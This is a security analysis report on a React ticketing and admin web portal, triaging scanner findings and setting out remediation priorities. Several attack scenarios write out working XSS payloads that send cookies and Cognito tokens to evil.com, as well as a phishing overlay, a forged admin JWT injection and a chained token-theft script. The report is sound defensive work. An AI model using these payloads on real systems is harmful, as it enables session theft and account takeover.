# Masar Admin Web - Security Analysis Report

**Report ID:** WARD-f8410453-ANALYSIS
**Date:** February 17, 2026
**Scope:** Analysis of WARD Security Scan (17 findings) + Project Security Posture
**Project:** Masar Admin Web Portal (React SPA)

---

## Executive Summary

A WARD security scan identified **17 findings** (12 HIGH, 4 MEDIUM, 1 INFO). After manual source code analysis by a 4-agent team, we determined that **over half are false positives** caused by the scanner misidentifying client-side React patterns as server-side vulnerabilities.

### Reclassified Severity After Analysis

| Severity | WARD Count | **Actual Count** | Change |
|----------|-----------|-------------------|--------|
| CRITICAL | 0 | **2** | +2 (escalated from HIGH) |
| HIGH | 12 | **2** | -10 |
| MEDIUM | 4 | **3** | -1 |
| LOW | 0 | **2** | +2 |
| FALSE POSITIVE | 0 | **7** | +7 |
| UNVERIFIABLE | 0 | **1** | +1 |

### Key Numbers

- **True Positives requiring action:** 9
- **False Positives (no action):** 7
- **Unverifiable:** 1
- **Findings escalated to CRITICAL:** 2 (SRI on payment script, DOM XSS)

---

## Finding-by-Finding Verdict

| # | WARD Sev. | **Actual Sev.** | Type | File | Verdict |
|---|-----------|-----------------|------|------|---------|
| 1 | HIGH | **FALSE POSITIVE** | Weak Random | `generate-bahrain-items.js:143` | Test data seed script; Math.random() acceptable |
| 2 | HIGH | **CRITICAL** | Missing SRI | `public/eazypay.html:4` | Mastercard payment gateway script unprotected |
| 3 | HIGH | **LOW** | Missing SRI | `public/index.html:16` | Font CSS only; minimal attack surface |
| 4 | HIGH | **MEDIUM** | Missing SRI | `public/privacy_policy.html:9` | Bootstrap CSS+JS without SRI |
| 5 | HIGH | **MEDIUM** | Missing SRI | `public/terms_and_condition.html:9` | Bootstrap CSS+JS without SRI |
| 6 | HIGH | **CRITICAL** | DOM XSS | `public/wmqr.extracted.js:150` | innerHTML with user-controlled passenger names |
| 7 | HIGH | **CRITICAL** | DOM XSS | `public/wmqr.extracted.js:150` | Duplicate of #6 (same code, different rule) |
| 8 | HIGH | **MEDIUM** | Missing SRI | `public/wmqr.html:8` | Tailwind CDN script (requires migration approach) |
| 9 | HIGH | **FALSE POSITIVE** | SSTI | `src/App.test.js:5` | React render() misidentified as EJS injection |
| 10 | HIGH | **FALSE POSITIVE** | SSTI | `src/index.js:14` | React root.render() misidentified as EJS injection |
| 11 | HIGH | **FALSE POSITIVE** | SSRF | `tripPassengerList/index.js:165` | Client-side fetch(); SSRF N/A in browser |
| 12 | HIGH | **FALSE POSITIVE** | SSRF | `src/utils/common.js:40` | Client-side fetch(); has functional CORS bug |
| 13 | MEDIUM | **MEDIUM** | JWT No Verify | `src/helpers/auth-helper.js:62` | jwtDecode() without signature verification |
| 14 | MEDIUM | **LOW** | Weak Random | `boatDetail/index.js:373` | Math.random() for device ID generation |
| 15 | MEDIUM | **FALSE POSITIVE** | Stored XSS | `TripsSummaryChart.js:23` | All data hardcoded; no user input |
| 16 | MEDIUM | **LOW** | Stored XSS | `revenue_dashboard.js:306` | Admin-only dashboard; data is admin-controlled |
| 17 | INFO | **UNVERIFIABLE** | SSRF | `public/wmqr.extracted.js:135` | File not found in current codebase |

---

## CRITICAL Findings (Immediate Action Required)

### CRIT-1: Mastercard Payment Gateway Script Without SRI (Finding #2)

**File:** `public/eazypay.html:4`
**CWE:** CWE-353 (Missing Support for Integrity Check)

```html
<script src="https://eazypay.gateway.mastercard.com/static/checkout/checkout.min.js"
        data-error="errorCallback"
        data-cancel="cancelCallback"></script>
```

**Why CRITICAL:**
- This is a **payment processing script** handling credit card data
- If the CDN is compromised (DNS hijack, supply chain attack), attackers can steal card numbers, CVVs, and session data
- Violates **PCI DSS** requirements for payment card handling
- Financial and regulatory consequences are severe

**Risk Scores:** Risk 74 | Exploitability 100 | Reachability 60

**Recommended Action:** Contact Mastercard for the official SRI hash and add `integrity` + `crossorigin` attributes immediately.

**How It Can Be Exploited:**

```
ATTACK SCENARIO: Supply Chain Payment Hijack
─────────────────────────────────────────────

Target:  eazypay.html — the Mastercard payment redirect page
Vector:  DNS hijack, BGP hijack, or CDN compromise
Prereq:  Network-level access (ISP, public WiFi, or CDN breach)

Step 1 — Attacker positions themselves
   The attacker compromises the DNS resolution for
   eazypay.gateway.mastercard.com (via DNS poisoning, BGP hijack,
   or compromising a CDN edge node).

Step 2 — Malicious script is served
   Instead of the real checkout.min.js, the attacker serves a modified
   version. Because there is NO integrity hash, the browser loads and
   executes it without question.

Step 3 — Payment interception
   The malicious script intercepts the Checkout.configure() call on
   line 27-30 of eazypay.html:

     Checkout.configure({ session: { id: sessionId } });
     Checkout.showPaymentPage();

   The attacker's script can:
   a) Clone the payment form UI and capture card details before
      forwarding to the real gateway (skimming attack)
   b) Replace the session ID to redirect payment to attacker's account
   c) Exfiltrate the session_id query parameter (line 24) which may
      allow replaying or hijacking the payment session
   d) Inject a fake "payment successful" page while stealing credentials

Step 4 — Data exfiltration
   Stolen card numbers, CVVs, and session tokens are sent to an
   attacker-controlled endpoint. The user sees a normal payment flow
   and has no indication of compromise.

IMPACT:
  - Credit card theft (card numbers, CVV, expiry)
  - Payment session hijacking via stolen session_id
  - Financial fraud (redirected payments)
  - PCI DSS violation → regulatory fines, loss of processing rights
  - Mass impact: affects ALL users who make payments

REAL-WORLD PRECEDENT:
  - British Airways (2018): Magecart attack on payment scripts, 380K
    cards stolen, £20M GDPR fine
  - Ticketmaster (2018): Third-party script compromised, 40K cards stolen
```

---

### CRIT-2: DOM XSS via innerHTML with Passenger Names (Findings #6, #7)

**File:** `public/wmqr.html` (wmqr.extracted.js, line ~150)
**CWE:** CWE-79 (Cross-Site Scripting)

```javascript
card.innerHTML = `
    <h3 class="font-bold">${passenger.given_name} ${passenger.family_name}</h3>
    <p>${segment.start_location.en}</p>
    ...
`;
```

**Why CRITICAL:**
- Passenger names (`given_name`, `family_name`) are **user-provided during booking**
- Directly injected into `innerHTML` without any sanitization
- Attack payload: booking a ticket with name `<img src=x onerror=alert(document.cookie)>`
- Affects the public-facing ticket/QR code display page
- Can steal session tokens, redirect users, or perform phishing

**Risk Scores:** Risk 76 | Exploitability 100 | Reachability 60

**Recommended Action:** Replace innerHTML with DOM methods using `textContent`, or sanitize with DOMPurify. Add backend name validation (allow only letters, spaces, hyphens, apostrophes).

**How It Can Be Exploited:**

```
ATTACK SCENARIO: XSS via Malicious Passenger Name
──────────────────────────────────────────────────

Target:  wmqr.html — public ticket/QR code display page
Vector:  Booking API → stored passenger name → rendered via innerHTML
Prereq:  Ability to create a booking (any customer)

Step 1 — Attacker books a ticket with malicious name
   Through the booking system (app or API), the attacker creates a
   booking with a crafted passenger name:

   given_name: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
   family_name: Smith

   OR for a more sophisticated attack:

   given_name: <script>
   family_name: document.location='https://evil.com/phish?d='+document.cookie</script>

Step 2 — Victim opens the ticket page
   The ticket page is accessed via QR code scan or direct URL:
   https://admin.masar-group.com/wmqr.html?bc=BOOKING123&td=20260217

   The page fetches ticket data from the GraphQL API (line 250):
     fetch(getApiUrl(), requestOptions)

Step 3 — Malicious HTML is rendered
   The API returns the passenger data. On line 289, the unsanitized
   name is injected directly into innerHTML:

     <h3 class="capitalize">${passenger.given_name} ${passenger.family_name}</h3>

   The browser parses and executes the injected HTML/JavaScript.

Step 4 — Attack executes
   The attacker's payload can:

   a) COOKIE THEFT:
      new Image().src='https://evil.com/steal?c='+document.cookie

   b) SESSION HIJACK:
      fetch('https://evil.com/log', {
        method:'POST',
        body: JSON.stringify({
          cookies: document.cookie,
          localStorage: JSON.stringify(localStorage),
          url: location.href
        })
      })

   c) PHISHING OVERLAY:
      document.body.innerHTML = '<div style="text-align:center;
        margin-top:50px"><h1>Session Expired</h1>
        <form action="https://evil.com/phish">
        <input placeholder="Email"><input type="password"
        placeholder="Password"><button>Login</button></form></div>'

   d) QR CODE REPLACEMENT:
      Replace the legitimate QR code image with one pointing to
      a phishing site, affecting anyone who scans it.

ADDITIONAL VULNERABLE FIELDS in the same innerHTML block:
  - segment.start_location.en (line 276) — station names from DB
  - segment.end_location.en (line 283) — station names from DB
  - passenger.qr_code_url (line 321) — could inject via src attribute
  - passenger.seat_info.seat_no (line 293)
  - passenger.seat_info.seat_type_code (line 297)

IMPACT:
  - Affects ANY user viewing a compromised ticket (public page)
  - Stored XSS: payload persists in database, triggers on every view
  - Can chain with QR code scanning — physical attack vector
  - Session tokens stored in localStorage are accessible via JS
  - No CSP headers = no script execution restrictions

ATTACK COMPLEXITY: LOW
  - Any customer who can book a ticket can exploit this
  - No authentication needed to VIEW the ticket page
  - Payload is stored and triggers automatically
```

---

## HIGH Findings

### HIGH-1: Bootstrap JavaScript Without SRI (Findings #4, #5)

**Files:** `public/privacy_policy.html`, `public/terms_and_condition.html`

```html
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
```

**Assessment:** JavaScript files from CDN can execute arbitrary code if compromised. While these are informational pages (not handling sensitive data), compromised JS can still steal cookies or redirect users.

**Recommended Action:** Add SRI using jsDelivr's official hash:
```
integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
```

**How It Can Be Exploited:**

```
ATTACK SCENARIO: CDN Compromise on Legal Pages
───────────────────────────────────────────────

Target:  privacy_policy.html, terms_and_condition.html
Vector:  jsDelivr CDN compromise or DNS hijack
Prereq:  CDN-level or network-level access

Step 1 — Attacker compromises the Bootstrap JS CDN response
   Via CDN breach, DNS poisoning, or MITM on public WiFi.

Step 2 — Malicious bootstrap.bundle.min.js is served
   The tampered script executes in the context of privacy_policy.html.
   Even though these are informational pages, the attacker can:

   a) Redirect users to a phishing page mimicking the login
   b) Inject a fake cookie consent banner that harvests data
   c) If same-origin cookies exist, exfiltrate session tokens
   d) Modify the privacy policy content to hide data collection
   e) Inject cryptocurrency miners

IMPACT: MEDIUM — Informational pages, but JS has full DOM access.
  Users trust legal pages and may not suspect malicious behavior.
```

---

## MEDIUM Findings

### MED-1: JWT Decoded Without Signature Verification (Finding #13)

**File:** `src/helpers/auth-helper.js:62`

```javascript
const userData = jwtDecode(token);
```

**Assessment:** Uses `jwtDecode()` which only **decodes** the Base64 payload without verifying the signature. While AWS Amplify validates tokens at the session layer, this violates defense-in-depth. If an attacker can inject a crafted JWT that bypasses the session layer, the app will trust its claims unconditionally.

**Mitigating Factor:** Token comes from `fetchAuthSession()` which validates via Cognito.

**Recommended Action:** Add explicit JWT signature verification against Cognito's JWKS endpoint using `jose` or `jsonwebtoken` library.

**How It Can Be Exploited:**

```
ATTACK SCENARIO: JWT Forgery via Unverified Token
─────────────────────────────────────────────────

Target:  auth-helper.js — decodeToken() and currentSessionDecoded()
Vector:  Crafted JWT injected via XSS or Amplify bypass
Prereq:  XSS vulnerability (e.g., CRIT-2 above) OR Amplify session manipulation

The auth-helper.js has empty catch blocks (lines 30, 40, 50, 64, 74)
and uses jwtDecode() which NEVER validates signatures.

Step 1 — Attacker crafts a malicious JWT
   Using jwt.io or any JWT tool, create a token with forged claims:

   {
     "cognito:username": "admin-user",
     "cognito:groups": ["admin"],
     "email": "attacker@example.com",
     "name": "Admin User"
   }

   Sign with any key (signature is never checked by jwtDecode).

Step 2 — Token injection
   If the attacker has XSS (via CRIT-2 or any future XSS):

     // Override Amplify's fetchAuthSession
     localStorage.setItem('CognitoIdentityServiceProvider.xxx.idToken',
       'eyJhbGciOiJIUzI1NiJ9.FORGED_PAYLOAD.fake_sig');

   OR manipulate the token in transit if HTTPS is downgraded.

Step 3 — Privilege escalation
   The app calls decodeToken() (line 70-78) which does:
     const userData = jwtDecode(token);  // No verification!

   Then uses the decoded claims for authorization:
   - isCaptain(userData) checks cognito:groups (line 81-88)
   - isAdmin(userData) checks cognito:groups (line 90-94)
   - getAllowedRouteTypes(userData) checks roles (line 114-132)

   The forged token grants admin access to the UI.

Step 4 — Impact
   a) UI shows admin-level routes and features
   b) currentAuthenticatedUser() returns forged identity (line 17-22)
   c) GraphQL API calls still use the original token (server may reject),
      BUT the UI will expose admin routes, data, and functionality
   d) Combined with API vulnerabilities, full admin takeover possible

MITIGATING FACTORS:
  - AWS Amplify validates tokens server-side during fetchAuthSession()
  - GraphQL API should independently verify tokens
  - Attack requires chaining with XSS or session manipulation
  - This is primarily a defense-in-depth violation

SEVERITY: MEDIUM — requires chaining, but enables privilege escalation
```

---

### MED-2: Bootstrap CSS Without SRI (Findings #4, #5)

**Assessment:** CSS-only resources have limited attack surface (visual manipulation, clickjacking) but should still be integrity-protected.

**Recommended Action:** Add SRI hash from jsDelivr.

---

### MED-3: Tailwind CDN Script Without SRI (Finding #8)

**File:** `public/wmqr.html:8`

**Assessment:** The Tailwind Play CDN is a dynamic JIT compiler that updates frequently — **SRI will break when content changes**. This is fundamentally a development tool being used in production.

**Recommended Action:** Migrate to build-time Tailwind CSS compilation (`npm install -D tailwindcss`). Do NOT add SRI to the dynamic CDN URL.

**How It Can Be Exploited:**

```
ATTACK SCENARIO: Tailwind CDN Script Tampering
───────────────────────────────────────────────

Target:  wmqr.html (public ticket page)
Vector:  CDN compromise of cdn.tailwindcss.com
Prereq:  CDN-level access

The Tailwind Play CDN is a FULL JavaScript runtime (not just CSS).
It compiles utility classes at runtime in the browser, meaning it
has complete DOM access and JavaScript execution capability.

If cdn.tailwindcss.com is compromised:
  - Attacker has full JS execution on the ticket display page
  - Can modify ticket content, steal QR codes, redirect users
  - Affects the same public-facing page as CRIT-2

ADDITIONAL CONCERN: SRI cannot be applied because the CDN content
  changes with updates. This is a development tool in production.
  The only real fix is migrating to build-time compilation.
```

---

## LOW Findings

### LOW-1: Weak Random Device ID (Finding #14)

**File:** `src/pages/boatBooking/boatDetail/index.js:373`

```javascript
const newDeviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
```

**Assessment:** Predictable device IDs. Severity depends on backend usage (analytics = LOW, authorization = HIGH).

**Recommended Action:** Replace with `crypto.randomUUID()`.

**How It Can Be Exploited:**

```
ATTACK SCENARIO: Device ID Prediction & Impersonation
─────────────────────────────────────────────────────

Target:  boatDetail/index.js — boat booking device tracking
Vector:  Predictable device_id in booking metadata
Prereq:  Knowledge of approximate booking time

The device ID is generated as:
  'device_' + Date.now() + '_' + Math.random().toString(36).substr(2,9)

Step 1 — Attacker observes their own device_id pattern
   Books a ticket and captures the device_id from network requests.
   Example: device_1708180800000_k7f3m2x9a

Step 2 — Predict other device IDs
   - Date.now() is the Unix timestamp in ms (completely predictable)
   - Math.random() has only ~2^52 bits of state in V8, and the seed
     can be partially predicted from timing
   - An attacker who knows the approximate booking time can generate
     a small set of candidate device IDs

Step 3 — Exploit depends on backend usage
   IF device_id is used for:
   - Rate limiting → bypass booking limits
   - Anti-fraud → impersonate legitimate devices
   - Session tracking → hijack another user's booking session
   - Analytics → corrupt tracking data

SEVERITY: LOW-MEDIUM depending on backend reliance on device_id
```

---

### LOW-2: Stored XSS in Revenue Dashboard Tooltip (Finding #16)

**File:** `src/pages/dashboard/revenue_dashboard.js:306`

**Assessment:** Station names from API rendered in ECharts tooltip HTML. Data is admin-controlled (not user-input), affecting only admin dashboard users. Exploitability requires compromised admin/database access.

**Recommended Action:** Add HTML escaping for defense-in-depth.

**How It Can Be Exploited:**

```
ATTACK SCENARIO: Admin Dashboard XSS via Station Names
───────────────────────────────────────────────────────

Target:  revenue_dashboard.js — ECharts tooltip in admin panel
Vector:  Malicious station name in database → rendered as HTML
Prereq:  Admin access or database compromise

Step 1 — Attacker modifies a station name
   Via admin panel or direct DB access, change a station name to:
   "Main Terminal<img src=x onerror=fetch('https://evil.com/'+document.cookie)>"

Step 2 — Admin views revenue dashboard
   The chart loads station names from GraphQL API (line 289-290):
     station?.station_name?.[i18next?.language || 'en']

   When admin hovers over the chart bar, the tooltip renders:
     ${params[0].axisValue}  ← unsanitized station name as HTML

Step 3 — JavaScript executes in admin's browser
   The onerror handler fires, exfiltrating the admin's session.

SEVERITY: LOW — Requires prior admin/DB access (chicken-and-egg).
  Primarily a defense-in-depth concern. If attacker already has admin
  access, there are more direct attack paths available.
```

---

### LOW-3: Inter Font CSS Without SRI (Finding #3)

**Assessment:** CSS-only font stylesheet with minimal attack surface.

**Recommended Action:** Self-host the Inter font or add SRI. Low priority.

---

## Attack Chain Analysis

The individual findings above become significantly more dangerous when **chained together**:

```
COMBINED ATTACK CHAIN: Customer → Admin Takeover
═════════════════════════════════════════════════

   CRIT-2 (XSS)          MED-1 (JWT)           Architecture (No CSP)
       │                      │                        │
       ▼                      ▼                        ▼
┌─────────────┐    ┌──────────────────┐    ┌──────────────────────┐
│ Book ticket  │    │ Forge JWT with   │    │ No CSP headers =     │
│ with XSS in │───>│ admin claims,    │───>│ no script restriction │
│ passenger    │    │ jwtDecode() will │    │ inline JS executes   │
│ name field   │    │ trust it without │    │ freely, fetch() to   │
│              │    │ verification     │    │ external domains OK  │
└─────────────┘    └──────────────────┘    └──────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────┐
│  STEP 1: Attacker books ticket with name:           │
│    <script>                                         │
│    // Steal admin's Amplify tokens from localStorage│
│    let tokens = {};                                 │
│    for(let k in localStorage) {                     │
│      if(k.includes('Cognito')) tokens[k]=           │
│        localStorage[k];                             │
│    }                                                │
│    fetch('https://evil.com/steal',{                 │
│      method:'POST',                                 │
│      body:JSON.stringify(tokens)                    │
│    });                                              │
│    </script>                                        │
│                                                     │
│  STEP 2: Share ticket link with admin user          │
│    "Can you check my booking?"                      │
│    https://admin.masar-group.com/wmqr.html?bc=X     │
│                                                     │
│  STEP 3: Admin opens link, XSS fires, tokens       │
│    exfiltrated to attacker's server                 │
│                                                     │
│  STEP 4: Attacker uses stolen Cognito tokens to     │
│    authenticate as admin against GraphQL API        │
│                                                     │
│  RESULT: Full admin access to Masar platform        │
│    - View/modify all bookings                       │
│    - Access passenger records (PII)                 │
│    - View financial data                            │
│    - Modify routes, schedules, pricing              │
└─────────────────────────────────────────────────────┘

CHAIN COMPLEXITY: LOW
  - Only requires creating a booking (any customer can do this)
  - Social engineering to get admin to open a ticket link
  - No special tools needed, works in any modern browser

THIS CHAIN EXISTS BECAUSE:
  1. No input sanitization on passenger names (CRIT-2)
  2. No Content Security Policy to block inline scripts
  3. Tokens stored in localStorage (accessible via JS)
  4. No JWT verification on client side (MED-1)
```

---

## False Positive Analysis

**7 out of 17 findings (41%) are false positives.** This indicates the WARD scanner needs tuning for React SPAs:

| Finding | Why False Positive |
|---------|-------------------|
| #1 (Weak Random) | Math.random() used for test seed data prices, not security |
| #9 (SSTI) | React Testing Library `render()` misidentified as EJS template injection |
| #10 (SSTI) | React 18 `root.render()` misidentified as EJS template injection |
| #11 (SSRF) | Client-side `fetch()` in browser — SSRF only applies server-side |
| #12 (SSRF) | Client-side `fetch()` in browser — not SSRF (has a CORS bug though) |
| #15 (Stored XSS) | All chart data is hardcoded static arrays, no user input possible |
| #17 (SSRF) | Source file not found in codebase; finding unverifiable |

**Recommendation:** Configure WARD to:
- Exclude React `render()` from SSTI rules
- Disable SSRF checks for client-side JavaScript
- Add data-flow analysis to reduce XSS false positives on static data

---

## Project Security Posture

### Architecture Overview

| Component | Technology |
|-----------|-----------|
| Framework | React 18.3.1 (Create React App) |
| Auth | AWS Cognito via Amplify 6.5.3 |
| API | GraphQL via Apollo Client 3.11.4 |
| Styling | Tailwind CSS 3.4.13 |
| Forms | Formik + Yup validation |
| i18n | i18next |
| Maps | Leaflet |
| Charts | ECharts 5.6.0 |

### Security Strengths

- **Strong authentication** - AWS Cognito with complex password policy + MFA/TOTP
- **Granular RBAC** - 9 distinct roles with route-level enforcement
- **Protected routes** - `ProtectedRoute` component guards all sensitive pages
- **API auth middleware** - Every GraphQL request includes JWT bearer token
- **Request timeouts** - 30-second timeout prevents hanging connections

### Security Gaps (Beyond WARD Findings)

| Gap | Risk Level | Impact |
|-----|-----------|--------|
| **No Content Security Policy (CSP)** | HIGH | XSS attacks can inject/execute arbitrary scripts |
| **No security headers** | HIGH | Clickjacking, MIME sniffing, no HSTS |
| **Silent error handling** | MEDIUM | Empty catch blocks in auth-helper.js hide failures |
| **Token in localStorage** | MEDIUM | XSS can steal auth tokens (no httpOnly cookie) |
| **No dependency auditing** | MEDIUM | Using deprecated `moment.js`, no `npm audit` in CI |
| **console.log in production** | LOW | Potential information disclosure |

---

## Prioritized Remediation Roadmap

### P0 — Immediate (Within 24 hours)

| Action | Finding | Effort |
|--------|---------|--------|
| Add SRI to Mastercard payment script | #2 | 1 hour |
| Fix innerHTML XSS in wmqr.html passenger names | #6, #7 | 2-3 hours |

### P1 — This Week

| Action | Finding | Effort |
|--------|---------|--------|
| Implement Content Security Policy (CSP) headers | Architecture | 4-6 hours |
| Add SRI to Bootstrap JS files | #4, #5 | 1 hour |
| Add security headers (X-Frame-Options, HSTS, etc.) | Architecture | 2-3 hours |

### P2 — Next Sprint

| Action | Finding | Effort |
|--------|---------|--------|
| Add JWT signature verification in auth-helper | #13 | 3-4 hours |
| Replace Math.random() with crypto.randomUUID() for device ID | #14 | 30 min |
| Add HTML escaping to dashboard tooltips | #16 | 1 hour |
| Add SRI to Bootstrap CSS, Font Awesome | #4, #5, #8 | 1 hour |
| Migrate wmqr.html Tailwind from CDN to build-time | #8 | 4-6 hours |

### P3 — Within 30 Days

| Action | Finding | Effort |
|--------|---------|--------|
| Self-host Inter font | #3 | 1-2 hours |
| Fix no-cors functional bug in common.js | #12 | 1 hour |
| Remove empty catch blocks, add error logging | Architecture | 4-6 hours |
| Set up `npm audit` in CI/CD | Architecture | 2 hours |
| Migrate from deprecated moment.js | Architecture | 8-16 hours |
| Configure WARD scanner exclusions to reduce false positives | Tooling | 2-3 hours |

---

## Risk Matrix

```
                    EXPLOITABILITY
              Low        Medium       High
         ┌──────────┬──────────┬──────────┐
  High   │          │  #13     │  #2, #6  │
         │          │  JWT     │  SRI+XSS │
IMPACT   ├──────────┼──────────┼──────────┤
  Med    │  #16     │  #4,#5   │  #8      │
         │  Tooltip │  Bootstrap│ Tailwind │
         ├──────────┼──────────┼──────────┤
  Low    │  #3      │  #14     │          │
         │  Font    │  DeviceID│          │
         └──────────┴──────────┴──────────┘
```

---

## Conclusion

The WARD scan revealed **2 genuinely critical issues** that require immediate attention:

1. **The Mastercard payment script** lacks integrity protection — a supply chain attack could steal customer payment data
2. **The ticket display page** has a DOM XSS vulnerability via unsanitized passenger names

Beyond the scan findings, the project has **strong authentication/authorization** via AWS Cognito but **lacks browser-level security hardening** (no CSP, no security headers, no SRI). These gaps are common in React SPAs built with Create React App and should be addressed systematically.

The scanner's **41% false positive rate** on this React project indicates it needs configuration tuning — particularly disabling server-side vulnerability rules (SSRF, SSTI) for client-side code.

**Total estimated remediation effort:** ~40-60 hours across all priorities.

---

*Report generated by 4-agent security analysis team*
*Analysis method: Manual source code review of all 17 WARD findings + architecture assessment*
